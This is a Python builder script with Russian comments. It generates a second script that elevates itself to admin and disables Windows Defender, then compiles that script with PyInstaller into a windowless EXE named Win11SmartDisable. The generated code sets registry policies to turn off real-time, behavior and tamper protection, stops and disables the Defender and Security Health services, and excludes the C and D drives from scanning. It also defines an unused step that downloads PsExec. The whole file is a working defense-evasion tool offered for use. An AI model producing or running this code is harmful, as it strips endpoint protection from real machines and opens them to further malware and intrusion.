import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_win11_defender_disable():
    win11_code = '''import os
import subprocess
import time
import ctypes
import sys

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False
    except:
        return False

if not run_as_admin():
    sys.exit()

time.sleep(2)

def disable_defender_smart():
    # Метод 1: Через утилиту Microsoft (надежнее)
    psexec_commands = [
        # Скачиваем и используем PsExec для обхода защиты
        'bitsadmin /transfer defenderdownload /download /priority normal "https://download.sysinternals.com/files/PSTools.zip" "C:\\\\Windows\\\\Temp\\\\PSTools.zip"',
        'powershell -Command "Expand-Archive -Path \\\"C:\\\\Windows\\\\Temp\\\\PSTools.zip\\\" -DestinationPath \\\"C:\\\\Windows\\\\Temp\\\\\\\" -Force"',
        'C:\\\\Windows\\\\Temp\\\\PsExec.exe -s -i reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f'
    ]
    
    # Метод 2: Безопасные команды которые работают
    safe_commands = [
        # Отключаем через политики (самый надежный способ)
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
        
        # Отключаем все компоненты защиты
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
        
        # Отключаем Tamper Protection
        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
        
        # Останавливаем службы (не удаляем!)
        'net stop WinDefend',
        'sc config WinDefend start= disabled',
        'net stop WdNisSvc',
        'sc config WdNisSvc start= disabled',
        'net stop SecurityHealthService', 
        'sc config SecurityHealthService start= disabled'
    ]
    
    # Метод 3: PowerShell команды
    ps_commands = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true", 
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Set-MpPreference -DisableScriptScanning $true",
        "Set-MpPreference -DisableArchiveScanning $true",
        "Set-MpPreference -PUAProtection disable",
        "Add-MpPreference -ExclusionPath 'C:\\\\'",
        "Add-MpPreference -ExclusionPath 'D:\\\\'"
    ]
    
    # Выполняем безопасные команды
    print("Applying registry policies...")
    for cmd in safe_commands:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            time.sleep(0.3)
        except:
            pass
    
    print("Applying PowerShell settings...")
    for cmd in ps_commands:
        try:
            subprocess.run(["powershell", "-Command", cmd], capture_output=True)
            time.sleep(0.3)
        except:
            pass
    
    # Обновляем политики
    subprocess.run("gpupdate /force", shell=True, capture_output=True)
    
    print("Windows Defender should be disabled now")
    print("If not working, try running in Safe Mode")

disable_defender_smart()
'''

    with open('win11_smart_disable.py', 'w', encoding='utf-8') as f:
        f.write(win11_code)

def compile_to_exe():
    os.system('pyinstaller --onefile --noconsole --name "Win11SmartDisable" win11_smart_disable.py')
    print("EXE создан: Win11SmartDisable.exe")

if __name__ == "__main__":
    install_pyinstaller()
    create_win11_defender_disable()
    compile_to_exe()
